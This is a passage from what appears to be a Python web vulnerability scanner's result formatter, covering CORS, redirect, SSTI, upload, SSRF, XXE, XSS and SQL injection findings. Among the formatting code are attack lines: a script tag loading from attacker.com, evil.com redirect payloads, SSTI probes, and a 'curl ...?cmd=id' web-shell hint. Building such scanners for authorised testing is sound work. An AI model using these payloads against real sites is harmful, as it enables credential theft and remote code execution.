                            f"       ⚠  XSS chain: find XSS on {origin}, "
                            f"inject the script below via:"
                        )
                        lines.append(
                            f"       {origin}/?xss=<script src=//attacker.com/cors.js></script>"
                        )
                        lines.append("")

                    # TLS-break specific hint
                    if oclass == "tls_break":
                        lines.append(
                            f"       ⚠  TLS break: requires MITM on HTTP traffic to {origin}."
                        )
                        lines.append(
                            f"       Intercept victim HTTP request → inject CORS request to {url}"
                        )
                        lines.append("")

                    lines.append(f"       ⛏ Exploit 1 — Standalone XHR")
                    lines.append(f"       {'─' * 52}")
                    lines.append(f"       Host on: {attacker_origin}/exploit.js")
                    lines.append(
                        f"       Include via <script src=exploit.js> or paste in console:"
                    )
                    lines.append("")
                    for el in xhr_lines:
                        lines.append(f"       {el}")
                    lines.append("")

                    lines.append(f"       ⛏ Exploit 2 — iframe sandbox (null origin / data: URI)")
                    lines.append(f"       {'─' * 52}")
                    lines.append(
                        f"       Works when ACAO: null accepted — sandboxed iframe sends null origin."
                    )
                    lines.append(f"       Host on any attacker page and deliver to victim.")
                    lines.append("")
                    lines.append(f"       [ Readable — for understanding ]")
                    for rline in iframe_exploit_readable.splitlines():
                        lines.append(f"       {rline}")
                    lines.append("")
                    lines.append(f"       [ Copy-paste ready — URL-encoded data: URI ]")
                    lines.append(f"       {iframe_exploit_encoded}")
                    lines.append("")

                # ── Remediation ───────────────────────────────────────────────
                if remediation:
                    lines.append(f"       ䷓ Remediation:")
                    for rem_line in textwrap.wrap(remediation, 65):
                        lines.append(f"       {rem_line}")
                lines.append("")

            # ── Risk Summary ──────────────────────────────────────────────────
            lines.append(f"{'─' * 70}")
            lines.append("  ☰ CORS Risk Summary")
            lines.append(f"{'─' * 70}")

            high_c    = [d for d in details if d.get("acac") == "true"]
            wildcard  = [d for d in details if d.get("acao") == "*"]
            high_nc   = [d for d in details
                        if d.get("confidence") == "HIGH" and d.get("acac") != "true"]
            xss_chain = [d for d in details if d.get("origin_class") == "xss_chain"]
            tls_break = [d for d in details if d.get("origin_class") == "tls_break"]
            private   = [d for d in details if d.get("origin_class") == "private_ip"]
            mswitch   = [d for d in details if "MSWITCH" in d.get("test_case", "")]
            med       = [d for d in details if d.get("confidence") == "MEDIUM"]
            no_vary   = [d for d in details if d.get("missing_vary")]

            if high_c:
                lines.append(
                    f"  Ⓒ CRITICAL — {len(high_c)} finding(s) expose credentials cross-origin.\n"
                    f"     Attacker page silently reads authenticated responses\n"
                    f"     (sessions, tokens, PII) from a logged-in victim."
                )
            if wildcard:
                lines.append(
                    f"  ⚔ WILDCARD — {len(wildcard)} finding(s) use ACAO: *.\n"
                    f"     Any origin on the internet can read these responses."
                )
            if xss_chain:
                lines.append(
                    f"  ⚔ XSS CHAIN — {len(xss_chain)} trusted subdomain(s) detected.\n"
                    f"     XSS on any of these subdomains pivots to CORS credential theft."
                )
            if tls_break:
                lines.append(
                    f"  ⚔ TLS BREAK — {len(tls_break)} HTTP subdomain(s) trusted on HTTPS endpoint.\n"
                    f"     MITM on HTTP traffic can inject a CORS request to the HTTPS endpoint."
                )
            if private:
                lines.append(
                    f"  ⚔ INTRANET — {len(private)} private IP/hostname(s) trusted.\n"
                    f"     External page can use victim browser as proxy to read internal resources."
                )
            if mswitch:
                _ms_desc = mswitch[0].get("description", "")
                _orig_m  = "original method"
                _flip_m  = "alternate method"
                if "original method was" in _ms_desc:
                    try:
                        _orig_m = _ms_desc.split("original method was")[1].strip().rstrip(")")
                        _flip_m = _ms_desc.split("with")[1].split("(")[0].strip()
                    except Exception:
                        pass
                lines.append(
                    f"  ⤮ METHOD-SWITCH — {len(mswitch)} finding(s) where CORS policy differs\n"
                    f"     by HTTP method. Restricted on {_orig_m} but not {_flip_m}."
                )
            if high_nc:
                lines.append(
                    f"  ⚠  HIGH — {len(high_nc)} finding(s) reflect arbitrary origins\n"
                    f"     without credentials. Non-auth data leakage possible."
                )
            if med:
                lines.append(
                    f"  Ⓜ MEDIUM — {len(med)} finding(s) with partial misconfiguration."
                )
            if no_vary:
                lines.append(
                    f"  🖂 CACHE RISK — {len(no_vary)} finding(s) missing Vary: Origin.\n"
                    f"     CDN may cache permissive response and serve to other origins."
                )
            lines.append("")

            return lines

    def format_open_redirect_results(self, result: Dict[str, Any]) -> List[str]:
        """Format Open Redirect scan results."""
        lines = []

        if not result:
            lines.append("  No results available.")
            return lines

        if "error" in result and not result.get("details"):
            lines.append(f"  ✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"  Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"  Summary : {summary}")
        lines.append(
            f"  Stats   : {stats.get('params_tested', 0)} parameter(s) tested | "
            f"{stats.get('payloads_sent', 0)} request(s) sent | "
            f"{stats.get('findings', 0)} finding(s)"
        )
        lines.append("")

        if not vulnerable:
            lines.append("  ✓ No open redirect vulnerabilities detected.")
            lines.append("")
            lines.append("  Payload categories tested:")
            for cat in [
                "Absolute URL (https://evil.com, http://)",
                "Protocol-relative (//evil.com)",
                "Slash tricks (/// \\\\ backslash variants)",
                "URL-encoding / double-encoding",
                "@ separator (trusted@evil.com, user:pass@evil.com)",
                "Fragment tricks (#evil.com, appended fragment)",
                "Null-byte injection",
                "CRLF Location-header injection",
                "Scheme confusion (javascript:, data:)",
                "Whitelist bypass (suffix/prefix/subdomain)",
            ]:
                lines.append(f"    • {cat}")
            return lines

        details = result.get("details", [])

        _CONF_ICON = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ"}
        _CONF_ORDER = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
        sorted_details = sorted(
            details,
            key=lambda d: _CONF_ORDER.get(d.get("confidence", "LOW"), 9)
        )

        lines.append(f"  ⚠  {len(sorted_details)} finding(s):")
        lines.append("")

        for i, d in enumerate(sorted_details, 1):
            conf      = d.get("confidence", "?")
            icon      = _CONF_ICON.get(conf, "•")
            param     = d.get("parameter", "?")
            ptype     = d.get("param_type", "url")
            payload   = d.get("payload", "")
            label     = d.get("payload_label", "")
            status    = d.get("status_code", "?")
            location  = d.get("location", "")
            method    = d.get("method", "")
            url       = d.get("url", "")
            note      = d.get("note", "")
            b_status  = d.get("baseline_status", "")
            b_loc     = d.get("baseline_location", "")

            lines.append(f"  {'─' * 68}")
            lines.append(f"  [{i}] {icon} [{conf}]  Parameter: {param}  ({ptype})")
            lines.append(f"  {'─' * 68}")
            lines.append(f"       Payload       : {payload}")
            lines.append(f"       Payload Type  : {label}")
            lines.append(f"       HTTP Status   : {status}")
            lines.append(f"       Location Hdr  : {location if location else '(not present)'}")
            lines.append(f"       Detection Via : {method}")
            lines.append(f"       URL           : {url}")
            if b_status or b_loc:
                lines.append(f"       Baseline      : HTTP {b_status}  Location: {b_loc or '(none)'}")
            lines.append(f"       Note          : {note}")
            lines.append("")

            # Exploitation PoC
            lines.append(f"       ⚡ PoC — attacker page that triggers redirect:")
            lines.append( "       <a href=\"" + url + "\">Click here</a>")
            lines.append("")

        return lines

    def format_ssti_results(self, result: Dict[str, Any]) -> List[str]:
        """Format Server-Side Template Injection scan results."""
        lines = []

        if not result:
            lines.append("  No results available.")
            return lines

        if "error" in result and not result.get("details"):
            lines.append(f"  ✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"  Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"  Summary : {summary}")
        lines.append(
            f"  Stats   : {stats.get('params_tested', 0)} parameter(s) tested | "
            f"{stats.get('payloads_sent', 0)} request(s) sent | "
            f"{stats.get('findings', 0)} finding(s)"
        )
        lines.append("")

        if not vulnerable:
            lines.append("  ✓ No SSTI vulnerabilities detected.")
            lines.append("")
            lines.append("  Probe syntax tested across all injection points:")
            for item in [
                "{{7*7}}                — Jinja2 / Twig / Pebble / Tornado",
                "${7*7}                — Freemarker / Mako / Spring-EL / Velocity",
                "#{7*7}                — Thymeleaf / Pebble / Java-EL",
                "<%= 7*7 %>            — ERB (Ruby) / EJS (Node.js)",
                "*{7*7}                — Spring Thymeleaf OGNL",
                "${{7*7}}              — Spring expression wrapper",
                "[[${7*7}]]            — Thymeleaf inline",
                "}}{{7*7}}{{           — Code-context break-out (Jinja2/Twig)",
                "}${7*7}{              — Code-context break-out (Freemarker/EL)",
                "${{<%[%'\"}}%\\       — Polyglot error probe (all engines)",
            ]:
                lines.append(f"    • {item}")
            return lines

        details = result.get("details", [])

        _CONF_ICON = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ"}
        _CONF_ORDER = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
        sorted_details = sorted(
            details,
            key=lambda d: _CONF_ORDER.get(d.get("confidence", "LOW"), 9)
        )

        lines.append(f"  ⚠  {len(sorted_details)} finding(s):")
        lines.append("")

        for i, d in enumerate(sorted_details, 1):
            conf       = d.get("confidence", "?")
            icon       = _CONF_ICON.get(conf, "•")
            param      = d.get("parameter", "?")
            ptype      = d.get("param_type", "url")
            engine     = d.get("engine", "Unknown")
            err_engine = d.get("error_engine", "")
            orig_val   = d.get("original_value", "")
            url        = d.get("url", "")
            method     = d.get("method", "GET")
            hit_list   = d.get("hit_payloads", [])

            lines.append(f"  {'─' * 68}")
            lines.append(f"  [{i}] {icon} [{conf}]  Parameter: {param}  ({ptype})")
            lines.append(f"  {'─' * 68}")
            lines.append(f"       Template Engine  : {engine}")
            if err_engine and err_engine != engine:
                lines.append(f"       Error Signature  : {err_engine}")
            lines.append(f"       Original Value   : {orig_val[:80] if orig_val else '(empty)'}")
            lines.append(f"       Endpoint         : {method} {url}")
            lines.append("")

            if hit_list:
                lines.append(f"       Successful probe(s):")
                for hp in hit_list:
                    snippet = hp.get("resp_snippet", "")
                    lines.append(f"         • [{hp.get('label','')}]  {hp.get('payload','')}  "
                                 f"→ expected '{hp.get('expected','')}' ({hp.get('engines','')})")
                    if snippet:
                        lines.append(f"           Context: {snippet[:120]}")
            lines.append("")

            # Exploitation guidance per engine
            expl = _SSTI_EXPLOIT_HINTS.get(engine, _SSTI_EXPLOIT_HINTS.get("Generic", []))
            if expl:
                lines.append(f"       ⚡ Exploitation guidance ({engine}):")
                for hint in expl:
                    lines.append(f"         {hint}")
            lines.append("")

        return lines

    def format_idor_results(self, result: Dict[str, Any]) -> List[str]:
        """Format IDOR scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary : {summary}")
        lines.append(
            f"Stats   : {stats.get('points_tested', 0)} point(s) tested | "
            f"{stats.get('candidates_sent', 0)} candidates sent | "
            f"HIGH={stats.get('high_confidence', 0)}  "
            f"MEDIUM={stats.get('medium_confidence', 0)}"
        )
        lines.append("")

        if not vulnerable:
            return lines

        details = result.get("details", [])

        # Group by confidence so HIGH findings appear first
        high   = [d for d in details if d.get("confidence") == "HIGH"]
        medium = [d for d in details if d.get("confidence") == "MEDIUM"]

        for group_label, group in [("HIGH", high), ("MEDIUM", medium)]:
            if not group:
                continue
            lines.append(f"{'─' * 60}")
            lines.append(f"  {group_label} CONFIDENCE  ({len(group)} finding(s))")
            lines.append(f"{'─' * 60}")

            for idx, d in enumerate(group, 1):
                unauth_tag = "  ※ UNAUTHENTICATED PROBE" if d.get("unauth") else ""
                lines.append("")
                lines.append(f"[{idx}] Parameter  : {d.get('parameter', '?')} "
                             f"({d.get('param_type', '?')}){unauth_tag}")
                lines.append(f"     Original   : {d.get('original', '?')}")
                lines.append(f"     Candidate  : {d.get('candidate', '?')}")
                lines.append(f"     Reason     : {d.get('reason', '?')}")
                lines.append(f"     Status     : baseline=HTTP {d.get('baseline_status', '?')} "
                             f"→ probe=HTTP {d.get('status_code', '?')}")
                lines.append(f"     Length     : baseline={d.get('baseline_length', '?')}b "
                             f"→ probe={d.get('length', '?')}b")
                lines.append(f"     URL        : {d.get('url', '?')}")

        return lines

    def format_upload_results(self, result: Dict[str, Any]) -> List[str]:
        """Format File Upload scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary : {summary}")
        lines.append(
            f"Stats   : {stats.get('test_cases_run', 0)} test cases | "
            f"{stats.get('payloads_sent', 0)} payloads sent | "
            f"{stats.get('hits', 0)} accepted"
        )
        lines.append("")

        if not vulnerable:
            return lines

        details = result.get("details", [])
        
        # ── RCE Verified Section ──────────────────────────────────────────
        rce_findings = [d for d in details if d.get("rce_verified")]
        if rce_findings:
            lines.append(f"{'═' * 60}")
            lines.append(f"  ⚔ RCE CONFIRMED ({len(rce_findings)} payloads)")
            lines.append(f"{'═' * 60}")
            
            for idx, d in enumerate(rce_findings, 1):
                lines.append("")
                lines.append(f"[{idx}] Filename    : {d.get('filename', '?')}")
                lines.append(f"     Test Case   : {d.get('test_case', '?')}")
                lines.append(f"     Verify URL  : {d.get('verify_url', '?')}")
                lines.append(f"     File URL    : {d.get('file_url', '?')}")
                lines.append(f"     Status      : HTTP {d.get('status_code', '?')}")
            lines.append("")
            lines.append("")

        # Group by test case
        from collections import defaultdict as _dd
        by_tc = _dd(list)
        for d in details:
            by_tc[d.get("test_case", "?")].append(d)

        TC_LABELS = {
            "TC1-Blacklist":      "TC-1  Blacklist Bypass",
            "TC2-Whitelist":      "TC-2  Whitelist Bypass (trailing chars / URL-encoding / unicode / recursive-strip)",
            "TC3-ContentType":    "TC-3  Content-Type Bypass",
            "TC4-MagicBytes":     "TC-4  Magic Bytes Bypass",
            "TC5-ExifShell":      "TC-5  EXIF Metadata Shell",
            "TC6-ConfigUpload":   "TC-6  Config File Upload",
            "TC7-SVG":            "TC-7  SVG Payload",
            "TC8-Filename":       "TC-8  Filename Injection",
            "TC9-TinyShell":      "TC-9  Tiny Shell",
            "TC10-ZipSlip":       "TC-10 Zip Slip",
            "TC11-PUT":           "TC-11 PUT Method Upload",
            "TC12-PathTraversal": "TC-12 File Upload Via Path Traversal in Filename",
        }

        idx = 0
        for tc_key in sorted(by_tc.keys()):
            # Find display label — match by prefix
            label = next(
                (v for k, v in TC_LABELS.items() if tc_key.startswith(k)),
                tc_key
            )
            lines.append(f"{'─' * 60}")
            lines.append(f"  {label}  ({len(by_tc[tc_key])} finding(s))")
            lines.append(f"{'─' * 60}")

            for d in by_tc[tc_key]:
                idx += 1
                lines.append("")
                rce_mark = "⚔ RCE VERIFIED " if d.get("rce_verified") else ""
                lines.append(f"[{idx}] {rce_mark}Filename    : {d.get('filename', '?')}")
                lines.append(f"     Content-Type: {d.get('content_type', '?')}")
                lines.append(f"     Description : {d.get('description', '?')}")
                lines.append(f"     Status      : HTTP {d.get('status_code', '?')} "
                             f"({d.get('response_length', '?')} bytes)")
                file_url = d.get("file_url", "")
                if file_url:
                    lines.append(f"     File URL    : {file_url}")
                    if not d.get("rce_verified"):
                        lines.append(f"     ⚡ Try       : curl '{file_url}?cmd=id'")
                snippet = d.get("response_snippet", "")
                if snippet:
                    lines.append(f"     Response    : {snippet[:120].strip()}")

        return lines

    def format_ssrf_results(self, result: Dict[str, Any]) -> List[str]:
        """Format SSRF scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})
        det_summ   = result.get("detection_summary", {})

        lines.append(f"Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary : {summary}")
        lines.append(
            f"Stats   : {stats.get('candidates_found', 0)} candidate(s) found | "
            f"{stats.get('payloads_tested', 0)} payloads tested | "
            f"{stats.get('vulnerabilities', 0)} finding(s)"
        )

        # Detection summary flags
        active_phases = [k for k, v in det_summ.items() if v]
        if active_phases:
            lines.append(f"Phases  : {', '.join(active_phases)}")
        lines.append("")

        if not vulnerable:
            return lines

        details = result.get("details", [])

        # Group by confidence
        groups = {"HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
        for d in details:
            groups.get(d.get("confidence", "INFO"), groups["INFO"]).append(d)

        for conf_label in ("HIGH", "MEDIUM", "LOW", "INFO"):
            group = groups[conf_label]
            if not group:
                continue
            icon = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ", "INFO": "ⓘ"}[conf_label]
            lines.append(f"{'─' * 60}")
            lines.append(f"  {icon} {conf_label} CONFIDENCE  ({len(group)} finding(s))")
            lines.append(f"{'─' * 60}")

            for idx, d in enumerate(group, 1):
                lines.append("")
                lines.append(f"[{idx}] Phase      : {d.get('phase', '?')}")
                lines.append(f"     Parameter  : {d.get('display', d.get('parameter', '?'))}")
                lines.append(f"     Payload    : {d.get('payload', '?')[:100]}")
                lines.append(
                    f"     Status     : baseline=HTTP {d.get('baseline_status', '?')} "
                    f"→ HTTP {d.get('status_code', '?')}"
                )
                lines.append(
                    f"     Length     : baseline={d.get('baseline_length', '?')}b "
                    f"→ {d.get('length', '?')}b"
                )
                lines.append(f"     Time       : {d.get('response_time', '?')}s")
                if d.get("note"):
                    lines.append(f"     Note       : {d['note']}")

        return lines


    def format_lfi_results(self, result: Dict[str, Any]) -> List[str]:
        """Format LFI / Path Traversal scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})
        fuzz_target = result.get("fuzz_target", "")

        lines.append(f"Status : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary: {summary}")
        lines.append(
            f"Stats  : {stats.get('payloads_tested', 0)} payloads tested, "
            f"{stats.get('matches', 0)} match(es)"
        )
        if fuzz_target:
            lines.append(f"Targets: {fuzz_target}")
        lines.append("")

        if not vulnerable:
            return lines

        details = result.get("details", [])
        lines.append(f"{'─' * 60}")
        lines.append(f"  CONFIRMED FINDINGS  ({len(details)} total)")
        lines.append(f"{'─' * 60}")

        for idx, d in enumerate(details, 1):
            lines.append("")
            lines.append(f"[{idx}] Parameter : {d.get('parameter', '?')}")
            lines.append(f"     Target    : {d.get('target', '?')}")
            lines.append(f"     Payload   : {d.get('payload', '?')}")
            lines.append(f"     Signature : {d.get('matched_signature', '?')}")
            lines.append(f"     Status    : HTTP {d.get('status_code', '?')}  "
                         f"({d.get('response_length', '?')} bytes)")
            lines.append(f"     URL       : {d.get('test_url', '?')}")

        return lines

    def format_cmdi_results(self, result: Dict[str, Any]) -> List[str]:
        """Format OS Command Injection scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"Status : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary: {summary}")
        lines.append(
            f"Stats  : output payloads={stats.get('output_payloads_tested', 0)} "
            f"(hits={stats.get('output_hits', 0)})  "
            f"time payloads={stats.get('time_payloads_tested', 0)} "
            f"(hits={stats.get('time_hits', 0)})"
        )
        lines.append("")

        if not vulnerable:
            return lines

        details = result.get("details", [])
        lines.append(f"{'─' * 60}")
        lines.append(f"  CONFIRMED FINDINGS  ({len(details)} total)")
        lines.append(f"{'─' * 60}")

        for idx, d in enumerate(details, 1):
            lines.append("")
            technique = d.get("technique", "?")
            lines.append(f"[{idx}] Technique  : {technique.upper()}")
            lines.append(f"     Parameter  : {d.get('parameter', '?')} ({d.get('param_type', '?')})")
            lines.append(f"     Payload    : {d.get('payload', '?')}")

            if technique == "output":
                lines.append(f"     Signature  : {d.get('signature', '?')}")
                lines.append(f"     Matched    : {d.get('matched', '?')}")
                lines.append(f"     Status     : HTTP {d.get('status_code', '?')} "
                             f"({d.get('response_length', '?')} bytes)")
            elif technique == "time-based":
                lines.append(f"     Platform   : {d.get('platform', '?')}")
                lines.append(f"     Delay      : {d.get('elapsed', '?')}s "
                             f"(threshold={d.get('threshold', '?')}s)")
                lines.append(f"     Confirmed  : {d.get('confirm_elapsed', '?')}s on 2nd probe")
                lines.append(f"     Status     : HTTP {d.get('status_code', '?')}")

            lines.append(f"     URL        : {d.get('url', '?')}")

        return lines

    def format_xxe_results(self, result: Dict[str, Any]) -> List[str]:
        """Format XXE (XML External Entity) scan results."""
        lines = []

        if "error" in result and not result.get("details"):
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})
        details    = result.get("details", [])

        lines.append(f"Status  : {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"Summary : {summary}")
        lines.append(
            f"Stats   : {stats.get('payloads_tested', 0)} payload(s) tested  |  "
            f"{stats.get('vulnerabilities', 0)} confirmed finding(s)"
        )

        phases_run = stats.get("phases_run", [])
        if phases_run:
            # De-duplicate while preserving order
            seen: set = set()
            unique = [p for p in phases_run if not (p in seen or seen.add(p))]
            lines.append(f"Phases  : {', '.join(unique)}")
        lines.append("")

        if not details:
            return lines

        # Separate by confidence tier
        high_f   = [d for d in details if d.get("confidence") == "HIGH"]
        medium_f = [d for d in details if d.get("confidence") == "MEDIUM"]
        oob_f    = [d for d in details if d.get("confidence") == "INFO"]

        tier_map = [
            ("Ⓗ HIGH — In-Band Confirmed",   high_f),
            ("Ⓜ MEDIUM — Anomaly Detected",  medium_f),
            ("ⓘ INFO — OOB Probes Sent",      oob_f),
        ]

        for tier_label, group in tier_map:
            if not group:
                continue
            lines.append(f"{'─' * 60}")
            lines.append(f"  {tier_label}  ({len(group)} finding(s))")
            lines.append(f"{'─' * 60}")

            for idx, d in enumerate(group, 1):
                lines.append("")
                lines.append(f"[{idx}] Phase      : {d.get('phase', '?')}")
                lines.append(f"     Technique  : {d.get('note', '?')}")
                payload_preview = (d.get("payload") or "")[:120]
                lines.append(f"     Payload    : {payload_preview}")
                lines.append(f"     HTTP Status: {d.get('status_code', '?')}")
                lines.append(f"     Length     : {d.get('length', '?')} b")
                if d.get("matched_sig"):
                    lines.append(f"     Signal     : {d['matched_sig']}")
                if d.get("snippet"):
                    snippet = d["snippet"][:200].replace("\n", " ↵ ")
                    lines.append(f"     Snippet    : {snippet}")
                lines.append(f"     URL        : {d.get('url', '?')}")

        if oob_f and not (high_f or medium_f):
            lines.append("")
            lines.append(
                "ℹ  OOB payloads were sent.  "
                "Check your interactsh dashboard for DNS/HTTP interactions.\n"
                "   Phases with OOB probes: 3 (blind entity), "
                "4 (% parameter entity), 5 (exfil DTD)"
            )

        return lines

    def format_xss_results(self, result: Dict[str, Any]) -> List[str]:
        """Format XSS scan results with confidence labels and evidence snippets"""
        lines = []

        if "error" in result:
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        lines.append(f"Status: {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append("")

        # ── Payload sources ────────────────────────────────────────────────
        payload_sources = result.get('payload_sources', [])
        if payload_sources:
            lines.append(f"🗁 Payload files used ({len(payload_sources)}):")
            for ps in payload_sources:
                lines.append(f"   • {ps}")
            lines.append("")

        if vulnerable:
            lines.append(f"SUMMARY: {result.get('summary', '')}")
            lines.append("")

            details = [d for d in result.get('details', []) if isinstance(d, dict)]

            # Group by confidence tier for a clean summary header
            high   = [d for d in details if d.get('xss_confidence') == 'HIGH']
            medium = [d for d in details if d.get('xss_confidence') == 'MEDIUM']
            low    = [d for d in details if d.get('xss_confidence') == 'LOW']
            info   = [d for d in details if d.get('xss_confidence') not in ('HIGH', 'MEDIUM', 'LOW')]

            lines.append("🞋 CONFIDENCE BREAKDOWN:")
            lines.append(f"  Ⓗ HIGH   (directly executable): {len(high)}")
            lines.append(f"  Ⓜ MEDIUM (potentially exploitable): {len(medium)}")
            lines.append(f"  Ⓛ LOW    (encoded / in comment): {len(low)}")
            lines.append(f"  ⓘ INFO   (reflected, context unclear): {len(info)}")
            lines.append("")

            lines.append(f"🔬 VULNERABLE PARAMETERS ({len(details)} finding(s)):")
            lines.append("")

            for i, detail in enumerate(details, 1):
                conf = detail.get('xss_confidence', 'INFO')
                icon = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ", "INFO": "ⓘ"}.get(conf, "ⓘ")

                lines.append(f"  [{i}] {icon} [{conf}] — {detail.get('location', 'URL')} → "
                             f"param: '{detail.get('parameter', 'Unknown')}'")
                lines.append(f"       Context  : {detail.get('reflection_location', 'Response body')}")
                # Full payload — not truncated
                lines.append(f"       Payload  : {detail.get('payload', '')}")
                if detail.get('context_snippet'):
                    lines.append(f"       Snippet  : ...{detail['context_snippet']}...")
                lines.append(f"       Status   : {detail.get('status_code', 'N/A')}")
                if detail.get('test_url'):
                    lines.append(f"       Test URL : {detail.get('test_url', '')}")
                lines.append("")
        else:
            lines.append(result.get('summary', 'No XSS vulnerabilities detected.'))

        return lines
    
    def format_sqli_results(self, result: Dict[str, Any]) -> List[str]:
        """Format SQL injection scan results with detailed per-technique evidence"""
        lines = []

        if "error" in result:
            lines.append(f"✗ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        lines.append(f"Status: {'⚠  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")

        if vulnerable:
            lines.append("")
            lines.append("=" * 60)
            lines.append(result.get('summary', 'SQL injection vulnerabilities detected!'))
            lines.append("=" * 60)
            lines.append("")

            confidence = result.get('confidence_score', 'INFO')
            conf_icon = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ", "INFO": "ⓘ"}.get(confidence, "ⓘ")
            lines.append(f"🞋 OVERALL CONFIDENCE: {conf_icon} {confidence}")

            db_fp = result.get('database_fingerprint')
            if db_fp:
                lines.append(f"🖫 DATABASE FINGERPRINT: {db_fp}")

            lines.append("")
            lines.append("⛏ DETECTION TECHNIQUES TRIGGERED:")

            detection = result.get('detection_summary', {})
            tech_lines = []
            if detection.get('error_based'):
                tech_lines.append("  ✓ Error-based     — database error messages exposed")
            if detection.get('boolean_based'):
                tech_lines.append("  ✓ Boolean-based   — TRUE/FALSE conditions produce different responses")
            if detection.get('time_based'):
                tech_lines.append("  ✓ Time-based      — deliberate delay observed in response")
            if detection.get('union_based'):
                tech_lines.append("  ✓ Union-based     — extra data appended to query output")
            if detection.get('auth_bypass'):
                tech_lines.append("  ✓ Auth bypass     — authentication logic subverted")
            lines.extend(tech_lines)

            lines.append("")
            lines.append("⌖ VULNERABLE INJECTION POINTS:")
            lines.append("")

            for idx, point in enumerate(result.get('details', []), 1):
                conf_p = point.get('confidence', 'INFO')
                icon_p = {"HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ", "INFO": "ⓘ"}.get(conf_p, "ⓘ")

                lines.append(f"  [{idx}] {point.get('injection_display', 'Unknown')}  {icon_p} {conf_p}")
                lines.append(f"       Param type    : {point.get('injection_type', 'N/A')}")
                lines.append(f"       Original value: {point.get('original_value', 'N/A')}")
                lines.append("")

                # Vulnerability chain
                chain = point.get('vulnerability_chain', [])
                if chain:
                    lines.append("       ⛏ EVIDENCE CHAIN:")
                    for link in chain:
                        lines.append(f"         {link}")
                    lines.append("")

                # Per-technique detailed evidence
                indicators = point.get('indicators', {})
                evidence_items = point.get('evidence', [])

                if indicators.get('error_based'):
                    lines.append("       ✗ ERROR-BASED EVIDENCE:")
                    # Pull matching evidence items
                    for ev in [e for e in evidence_items if e.get('db_type') or e.get('error_pattern')]:
                        lines.append(f"         • Payload   : {ev.get('payload', '')}")
                        lines.append(f"           DB type   : {ev.get('db_type', 'Unknown')}")
                        lines.append(f"           Pattern   : {ev.get('error_pattern', 'N/A')}")
                        lines.append(f"           HTTP status: {ev.get('status_code', 'N/A')}")
                    lines.append("")

                if indicators.get('boolean_based'):
                    lines.append("       ⌕ BOOLEAN-BASED EVIDENCE:")
                    for ev in [e for e in evidence_items if e.get('payload_pair')]:
                        lines.append(f"         • Pair      : {ev.get('payload_pair', '')}")
                        lines.append(f"           True len  : {ev.get('true_length', 'N/A')}b")
                        lines.append(f"           False len : {ev.get('false_length', 'N/A')}b")
                        lines.append(f"           Diff      : {ev.get('difference', 'N/A')}b "
                                     f"({ev.get('relative_diff_pct', '?')}% relative)")
                        lines.append(f"           Reason    : {ev.get('detection_reason', '')}")
                    lines.append("")

                if indicators.get('time_based'):
                    lines.append("       ⏱  TIME-BASED EVIDENCE:")
                    for ev in [e for e in evidence_items if e.get('time_difference') or (e.get('db_type') and e.get('baseline_time'))]:
                        lines.append(f"         • Payload   : {ev.get('payload', '')}")
                        lines.append(f"           DB type   : {ev.get('db_type', 'N/A')}")
                        lines.append(f"           Baseline  : {ev.get('baseline_time', '?')}s")
                        lines.append(f"           Response  : {ev.get('response_time', '?')}s")
                        lines.append(f"           Δ time    : +{ev.get('time_difference', '?')}s "
                                     f"(threshold {ev.get('required_diff', '?')}s)")
                    lines.append("")

                if indicators.get('union_based'):
                    lines.append("       ⭮ UNION-BASED EVIDENCE:")
